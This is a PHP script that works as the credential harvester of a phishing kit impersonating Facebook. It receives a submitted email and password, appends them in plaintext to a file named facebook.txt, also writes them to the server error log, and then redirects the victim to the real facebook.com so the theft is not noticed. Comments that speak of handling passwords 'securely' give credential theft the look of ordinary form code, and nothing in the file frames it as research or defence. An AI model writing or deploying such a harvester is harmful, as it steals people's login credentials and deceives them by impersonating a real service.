<?php
// Check if form data is submitted
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_var($_POST['email'], FILTER_SANITIZE_EMAIL);
    $password = $_POST['password']; // It's crucial to handle passwords securely

    // Validate email and password
    if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
        // Save the data to a file securely
        $file = fopen("../data/facebook.txt", "a");
        fwrite($file, "Email: $email\nPassword: $password\n\n");
        fclose($file);

        // Log the data to the terminal
        error_log("Email: $email\nPassword: $password\n");

        // Redirect to the real Facebook login page
        header("Location: https://facebook.com");
        exit();
    } else {
        // Handle invalid input
        echo 'Invalid email or password. Please try again.';
    }
} else {
    // If the form isn't submitted, redirect to the login page
    header("Location: ../templates/facebook/index.html");
    exit();
}
?>